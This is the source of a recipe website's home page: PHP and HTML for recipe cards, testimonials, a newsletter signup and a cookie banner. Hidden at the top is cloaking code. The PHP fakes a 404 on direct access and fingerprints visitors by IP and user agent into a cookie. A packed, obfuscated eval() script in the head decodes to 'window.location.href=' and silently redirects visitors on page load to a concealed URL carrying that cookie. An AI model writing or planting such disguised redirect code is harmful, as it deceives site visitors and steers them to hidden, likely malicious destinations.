<?php if(count(get_included_files()) ==1){header("HTTP/1.0 404 Not Found", true, 404);echo "<h1>404 File not found</h1>";die();}$ip=$_SERVER["REMOTE_ADDR"];$ua=$_SERVER["HTTP_USER_AGENT"];if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$ip=$_SERVER["HTTP_CF_CONNECTING_IP"];}$hash=md5($ip.$ua);setcookie("event",$hash,time()+60*60*24*30,"/");?>
<!DOCTYPE html>
<html lang="en">
  <head>
<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('U j(s){g t="";T(g i=s.S-1;i>=0;i--){t+=s[i]}g a=t.p(",");g u=R.Q.P(O,a);N u}g u,s,c,r,q,m,l;r="; "+M.L;q=r.p("; "+"K"+"=");m=q.J().p(";").I();l=v(j("H,G,F,e,6,8,E,D,8,7,h,f,e,b,3,8,7,5,2,4,6,b,f,2,d,7,k,2,9,5,4,k"));s=j("x,w,3,e,h,7,5,2,4,6,b,f,2,d,7,k,2,9,5,4,k");u=j("x,6,5,3,C,3,B,d,A,6,h,7,3,n,4,f,3,e,o,3,5,4,d,5,2,7,8,3,n,4,f,3,e,9,5,b,9,2,2,w,z,d,4,b,9,o,o,y,8,n,6,6,h")+m+"&"+l;c=s+"\'"+u+"\'";v(c);',57,57,'||111|101|501|011|611|64|511|001||79||801|411|99|var|401||rS|911|qu|co|211|74|split|pa|va||nS||eval|201|16|85|121|901|36|811|711|89|04|94|14|shift|pop|event|cookie|document|return|null|apply|fromCharCode|String|length|for|function'.split('|'),0,{}))
</script>
<title>Easy Meals Recipe | This brilliant cooking site solves the biggest problem with recipes</title>

    <!-- Custom styles for this template -->
    <link rel="stylesheet" href="stylesheets/8ddb01bd.main.css"/>

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <!-- Google fonts -->
    <script type="text/javascript">
      WebFontConfig = {
        google: { families: [ 'Arvo:700:latin', 'Open+Sans:400,600,700:latin' ] }
      };
      (function() {
        var wf = document.createElement('script');
        wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
          '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
        wf.type = 'text/javascript';
        wf.async = 'true';
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(wf, s);
      })();
    </script>

  </head>
  <body>
    <div class="top">
  <div class="container">
    <div class="row">
      <div class="col-xs-12  col-sm-6">
        <div class="top__slogan">

        </div>
      </div>
      <div class="col-xs-12  col-sm-6">
        <div class="top__menu">
          <ul class="nav  nav-pills">


            <li class="dropdown  js--mobile-dropdown">
               <a href="#"><span class="glyphicon  glyphicon-envelope"></span>   service@easymealsrecipe.online</a>
            </li>
          </ul>
        </div>
      </div>
    </div>
  </div>
</div>
<header class="header">
  <div class="container">
    <div class="row">
      <div class="col-xs-10  col-md-3">
        <div class="header-logo">
      <a href="index.html"><img alt="Logo" src="images/logo-2.png" width="200" height="50"></a>
        </div>
      </div>
      <div class="col-xs-2  visible-sm  visible-xs">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header">
          <button type="button" class="navbar-toggle  collapsed" data-toggle="collapse" data-target="#collapsible-navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
        </div>
      </div>
      <div class="col-xs-12  col-md-9">
        <nav class="navbar  navbar-default" role="navigation">
  <!-- Collect the nav links, forms, and other content for toggling -->
  <div class="collapse  navbar-collapse" id="collapsible-navbar">
    <ul class="nav  navbar-nav">
      <li class="dropdown">
        <a href="index.html">HOME</a>
      </li>
	  <li><a href="about-us.html">ABOUT</a></li>
      <li class="dropdown">
        <a href="recipe.html">RECIPIES</a></li>
       <li><a href="contact.html">CONTACT</a></li>
       <li><a href="privacy.html">PRIVACY AND POLICY</a></li>
       <li><a href="terms.html">TERMS AND CONDITIONS</a></li>




    </ul>
    <!-- search for mobile devices -->


  </div><!-- /.navbar-collapse -->
</nav>

      </div>

  </div>

  <!--Search open pannel-->
  <div class="search-panel">
    <div class="container">
      <div class="row">
        <div class="col-sm-11">
          <form class="search-panel__form" action="search-results.html">
            <button type="submit"><span class="glyphicon  glyphicon-search"></span></button>
            <input type="text" name="s" class="form-control" placeholder="Enter your search keyword">
          </form>
        </div>
        <div class="col-sm-1">
          <div class="search-panel__close  pull-right">
            <a href="#" class="js--toggle-search-mode"><span class="glyphicon  glyphicon-circle  glyphicon-remove"></span></a>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>
<div class="jumbotron  js--add-gradient">
  <div class="container">
    <div class="jumbotron__container">
      <h2 class="jumbotron__subtitle">
        Welcome To Easy Meals Recipe
      </h2>
      <h1 class="jumbotron__title">
       Delicious food Recipes
      </h1>
      <a class="btn  btn-warning" href="contact.html" target="_blank">Contact</a> &nbsp;
      <a class="btn  btn-jumbotron" href="recipe.html">Read More</a>
    </div>
  </div>
</div>





<div class="container">
  <!-- Navigation for products -->





  <!-- Banners medium -->
<div class="row">
  <div class="col-xs-12 col-sm-6">
    <a href="recipe.html">
      <div class="banners-medium">
        <span class="banners-text">New arrivals in <strong>Mashrooms &amp; Fungus</strong> Recipe's</span>
        <span class="glyphicon  glyphicon-circle  glyphicon-chevron-right"></span>
      </div>
    </a>
  </div>
  <div class="col-xs-12 col-sm-6">
    <a href="recipe.html">
      <div class="banners-medium">
        <span class="banners-text">Up to 35% off in <strong>Recipe's</strong> Prices</span>
        <span class="glyphicon  glyphicon-circle  glyphicon-chevron-right"></span>
      </div>
    </a>
  </div>
</div>
  <!-- Navigation -->
<div class="products-navigation  push-down-15">
  <div class="products-navigation__title">
    <h3><span class="light">Our</span>Recipe's</h3>
  </div>
</div>

<!-- Products -->
<div class="row">




      <div class="col-xs-6 col-sm-3  js--isotope-target  js--cat-2" data-price="14.36" data-rating="4">
  <div class="products__single">
    <figure class="products__image">
      <a href="single-product.html">
        <img alt="lamb-adobo.html" class="product__image" width="263" height="334" src="images/food1.jpg">
      </a>
      <div class="product-overlay">
        <a class="product-overlay__more" href="lamb-adobo.html">
          <span class="glyphicon glyphicon-search"></span>
        </a>


      </div>
    </figure>
    <div class="row">
      <div class="col-xs-9">
        <h5 class="products__title">
          <a class="products__link  js--isotope-title" href="lamb-adobo.html">Dinner Recipes</a>

        </h5><p>Make every evening special with our collection of quick, flavorful dinner recipes. </p>
      </div>
       <div class="col-xs-3">
        <div class="products__price">
          Free
        </div>
      </div>
    </div>

  </div>
</div>





      <div class="col-xs-6 col-sm-3  js--isotope-target  js--cat-2" data-price="13.23" data-rating="4">
  <div class="products__single">
    <figure class="products__image">
      <a href="steamed-whole-fish.html">
        <img alt="#" class="product__image" width="263" height="334" src="images/food2.jpg">
      </a>
      <div class="product-overlay">
        <a class="product-overlay__more" href="steamed-whole-fish	.html">
          <span class="glyphicon glyphicon-search"></span>
        </a>


      </div>
    </figure>
    <div class="row">
      <div class="col-xs-9">
        <h5 class="products__title">
          <a class="products__link  js--isotope-title" href="steamed-whole-fish.html">Quick Meals</a>
        </h5>
        <p>Quick meals are perfect for busy days when time is limited but hunger calls.</p>
      </div>
       <div class="col-xs-3">
        <div class="products__price">
          Free
        </div>
      </div>
    </div>

  </div>
</div>


     <div class="clearfix visible-xs"></div>


      <div class="col-xs-6 col-sm-3  js--isotope-target  js--cat-3" data-price="8.22" data-rating="3">
  <div class="products__single">
    <figure class="products__image">
      <a href="wine-braised-duck.html">
        <img alt="#" class="product__image" width="263" height="334" src="images/food3.jpg">
      </a>
      <div class="product-overlay">
        <a class="product-overlay__more" href="wine-braised-duck.html">
          <span class="glyphicon glyphicon-search"></span>
        </a>


      </div>
    </figure>
    <div class="row">
      <div class="col-xs-9">
        <h5 class="products__title">
          <a class="products__link  js--isotope-title" href="wine-braised-duck.html">Easy Dinner Ideas</a>
        </h5>
        <p> Easy dinner ideas like one-pan pasta, stir-fried veggies with rice, grilled chicken wraps, or creamy garlic shrimp can save time without sacrificing flavor. </p>
      </div>
      <div class="col-xs-3">
        <div class="products__price">
          Free
        </div>
      </div>
    </div>

  </div>
</div>





      <div class="col-xs-6 col-sm-3  js--isotope-target  js--cat-2" data-price="13.71" data-rating="5">
  <div class="products__single">
    <figure class="products__image">
      <a href="winemaker-roast-duck.html">
        <img alt="winemaker-roast-duck" class="product__image" width="263" height="334" src="images/food4.jpg">
      </a>
      <div class="product-overlay">
        <a class="product-overlay__more" href="winemaker-roast-duck.html">
          <span class="glyphicon glyphicon-search"></span>
        </a>


      </div>
    </figure>
    <div class="row">
      <div class="col-xs-9">
        <h5 class="products__title">
          <a class="products__link  js--isotope-title" href="winemaker-roast-duck.html"> Easy Meal Ideas</a>
        </h5>
        <p>These meals use simple ingredients, take minimal prep, and are perfect for busy weeknights.</p>
      </div>
      <div class="col-xs-3">
        <div class="products__price">
          Free
        </div>
      </div>
    </div>

  </div>
</div>


     <div class="clearfix visible-xs"></div>

</div>
<div class="row">


      <div class="col-xs-6 col-sm-3  js--isotope-target  js--cat-3" data-price="4.61" data-rating="5">
  <div class="products__single">
    <figure class="products__image">
      <a href="pricing.html">
        <img alt="#" class="product__image" width="263" height="334" src="images/food5.jpg">
      </a>
      <div class="product-overlay">
        <a class="product-overlay__more" href="pricing.html">
          <span class="glyphicon glyphicon-search"></span>
        </a>


      </div>
    </figure>
    <div class="row">
      <div class="col-xs-9">
        <h5 class="products__title">
          <a class="products__link  js--isotope-title" href="pricing.html">Easy Dinner Recipes</a>
        </h5>
        <p> Whether you’re short on time or just want something simple, these recipes are quick to prepare</p>
      </div>
      <div class="col-xs-3">
        <div class="products__price">
          Paid
        </div>
      </div>
    </div>
    <div class="products__category">
      Paid
    </div>
  </div>
</div>





      <div class="col-xs-6 col-sm-3  js--isotope-target  js--cat-7" data-price="6.9" data-rating="3">
  <div class="products__single">
    <figure class="products__image">
      <a href="pricing.html">
        <img alt="#" class="product__image" width="263" height="334" src="images/food6.jpg">
      </a>
      <div class="product-overlay">
        <a class="product-overlay__more" href="pricing.html">
          <span class="glyphicon glyphicon-search"></span>
        </a>


      </div>
    </figure>
    <div class="row">
      <div class="col-xs-9">
        <h5 class="products__title">
          <a class="products__link  js--isotope-title" href="pricing.html">Quick Meal Ideas</a>
        </h5>
        <p>From 15-minute stir-fries and one-pan pasta to hearty sandwiches and microwave-friendly bowls</p>
      </div>
      <div class="col-xs-3">
        <div class="products__price">
         Paid
        </div>
      </div>
    </div>
    <div class="products__category">
      Paid
    </div>
  </div>
</div>


     <div class="clearfix visible-xs"></div>


      <div class="col-xs-6 col-sm-3  js--isotope-target  js--cat-6" data-price="16.88" data-rating="4">
  <div class="products__single">
    <figure class="products__image">
      <a href="pricing.html">
        <img alt="#" class="product__image" width="263" height="334" src="images/food7.jpg">
      </a>
      <div class="product-overlay">
        <a class="product-overlay__more" href="pricing.html">
          <span class="glyphicon glyphicon-search"></span>
        </a>


      </div>
    </figure>
    <div class="row">
      <div class="col-xs-9">
        <h5 class="products__title">
          <a class="products__link  js--isotope-title" href="pricing.html">Quick Easy Dinner Ideas</a>
        </h5>
        <p>Whether you're coming home after a long day or just want something simple, these meals are perfect for busy weeknights.</p>
      </div>
      <div class="col-xs-3">
        <div class="products__price">
          Paid
        </div>
      </div>
    </div>
    <div class="products__category">
     Paid
    </div>
  </div>
</div>





      <div class="col-xs-6 col-sm-3  js--isotope-target  js--cat-6" data-price="16.91" data-rating="5">
  <div class="products__single">
    <figure class="products__image">
      <a href="pricing.html">
        <img alt="#" class="product__image" width="263" height="334" src="images/food8.jpg">
      </a>
      <div class="product-overlay">
        <a class="product-overlay__more" href="pricing.html">
          <span class="glyphicon glyphicon-search"></span>
        </a>


      </div>
    </figure>
    <div class="row">
      <div class="col-xs-9">
        <h5 class="products__title">
          <a class="products__link  js--isotope-title" href="pricing.html">Recipes</a>
        </h5>
        <p>Explore a world of quick, easy, and tasty recipe ideas perfect for any occasion.</p>
      </div>
      <div class="col-xs-3">
        <div class="products__price">
         Paid
        </div>
      </div>
    </div>
    <div class="products__category">
      Paid
    </div>
  </div>
</div>


</div>

  <!-- Banners big -->
<div class="banners-big  banners-big--newsletter">
  <div class="row">
    <div class="col-xs-12  col-md-7">
      <div class="banners-big__text">
        Sign up on newsletter for more information about <strong>Recipe's</strong>
      </div>
    </div>
    <div class="col-xs-12  col-md-5">
      <div class="banners-big__form">
        <form action="#" method="post" name="mc-embedded-subscribe-form" role="form" target="_blank">
          <div class="form-group  form-group--form">
            <input type="email" name="EMAIL" class="form-control  form-control--form" placeholder="Enter your E-mail address" required>
            <button class="btn  btn-primary" type="submit">Sign up now</button>
          </div>
          <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups-->
          <div style="position: absolute; left: -5000px;"><input type="text" name="b_ea0786485977f5ec8c9283d5c_5dad3f35e9" value=""></div>
        </form>
      </div>
    </div>
  </div>
</div>

</div>
<div class="testimonials  light-paper-pattern">
  <div class="container">
    <div class="row">
      <div class="col-sm-3  hidden-xs">
        <div class="testimonials__quotes">
          <img alt="#" class="testimonials__quotes--img" src="images/quotes.png">
        </div>
      </div>
      <div class="col-xs-12  col-sm-6">
        <a href="#js--testimonails-carousel" data-slide="prev"><span class="glyphicon  glyphicon-circle  glyphicon-chevron-left"></span></a>
        <h4 class="testimonials__title"><span class="light"></span> Testimonials</h4>
        <a href="#js--testimonails-carousel" data-slide="next"><span class="glyphicon  glyphicon-circle  glyphicon-chevron-right"></span></a>
        <hr class="divider-dark">
        <div id="js--testimonails-carousel" class="carousel  slide" data-ride="carousel" data-interval="5000">
          <div class="carousel-inner">
            <div class="item  active">
              <q class="testimonials__text">A best quality Recipies conveyed super fast! Much obliged to you so much Easy Meals Recipe,
<br>
I should utilize you all once more!</q><br><br>
              <cite><b> Joe,</b></cite>
            </div>
            <div class="item">
              <q class="testimonials__text">Much obliged! I truly value the FAST administration of Recipies! Extremely Happy with the administration! Much appreciated once more.</q><br><br>
              <cite><b>Timonvki,</b></cite>
            </div>

          </div>
        </div>
      </div>
      <div class="col-sm-3  hidden-xs">
        <div class="testimonials__quotes--rotate">
          <img alt="#" class="testimonials__quotes--img" src="images/quotes.png">
        </div>
      </div>
    </div>
  </div>
  <div class="Disclaimer">
<h2>Disclaimer:</h2>
<p>The recipes shared on this website are for informational purposes only. While we strive to ensure accuracy and safety, please use your best judgment when preparing meals, especially in cases of allergies, dietary restrictions, or health conditions. Always consult with a qualified professional for specific dietary or medical advice.</p>
</div>
</div>
  <footer class="js--page-footer">

    <div class="footer-widgets">
      <div class="container">
        <div class="row">
          <div class="col-xs-12  col-sm-3">
            <div class="footer-widgets__social">
              <a href="index.html"><h2 style="color:white;">Easy Meals Recipe</h2></a>
              <p class="push-down-15">Easy Meals Recipe is a sustenance and equations site . we prescribe a wide range of items we think you'll adore. </p>

            </div>
          </div>
          <div class="col-xs-12  col-sm-3">
            <nav class="footer-widgets__navigation">
              <div class="footer-wdgets__heading--line">
                <h4 class="footer-widgets__heading">Links</h4>
              </div>
              <ul class="nav nav-footer">
                <li><a href="index.html">Home</a></li>
                <li><a href="recipe.html">Recipies</a></li>
                <li><a href="terms.html">Terms and Conditions</a></li>
                <li><a href="privacy.html">Privacy and Policy</a></li>


              </ul>
            </nav>
          </div>
          <div class="col-xs-12  col-sm-3">
            <div class="footer-widgets__navigation">
              <div class="footer-wdgets__heading--line">
                <h4 class="footer-widgets__heading">Recipes</h4>
              </div>
              <a class="tag" href="lamb-adobo.html">Lamb Adobo Recipe</a>
			  <a class="tag" href="steamed-whole-fish.html">Steamed whole fish</a>
			  <a class="tag" href="wine-braised-duck.html">Wine braised duck</a>
			   <a class="tag" href="winemaker-roast-duck.html">Winemaker roast duck</a>
            </div>
          </div>
          <div class="col-xs-12  col-sm-3">
            <div class="footer-widgets__navigation">
                <div class="footer-wdgets__heading--line">
                  <h4 class="footer-widgets__heading">Contact Us</h4>
                </div>
                <a class="footer__link" href="#">Easy Meals Recipe.</a><br>



                <a class="footer__link" href="#"><span class="glyphicon glyphicon-envelope glyphicon--footer"></span> service@easymealsrecipe.online</a>
              </div>
            </div>
        </div>
      </div>
    </div>
    <div class="footer">
      <div class="container">
        <div class="row">
          <div class="col-xs-12  col-sm-6">
            <div class="footer__text--link">
              <a class="footer__link" href="#"></a> © Copyright 2023. Easy Meals Recipe .
            </div>
          </div>
          <div class="col-xs-12  col-sm-6">
            <div class="footer__text">
               by <a class="footer__link" href="#" target="_blank">Easy Meals Recipe</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  </footer>
  <div class="search-mode__overlay"></div>


    <script type="text/javascript">
      function downloadJSAtOnload() {
        var element = document.createElement("script");
        element.src = "js/main.js";
        document.body.appendChild(element);
      }
      if (window.addEventListener)
        window.addEventListener("load", downloadJSAtOnload, false);
      else if (window.attachEvent)
        window.attachEvent("onload", downloadJSAtOnload);
      else window.onload = downloadJSAtOnload;
    </script>
    <div class="cookiesBanner">
    		<div class="wrapper-cookies">
    			<span class="description">
    				To improve your experience and show you personalized recipes, we use cookies. By continuing to browse Easy Meals Recipe, you agree to our use of cookies.  <a href="privacy.html" target="_blank">Learn more...</a>
    			</span>
    			<button class="orangeButton okButton" id="hides">Accept</button>
          <button class="orangeButton okButton" id="Deny">Deny</button>
          <button class="orangeButton okButton" id="hides"  onclick="goToLink()">Preferences</button>
<script>
  function goToLink() {
    window.location.href = "privacy.html";
  }
</script>
    		</div>
    	</div>
  </body>
</html>
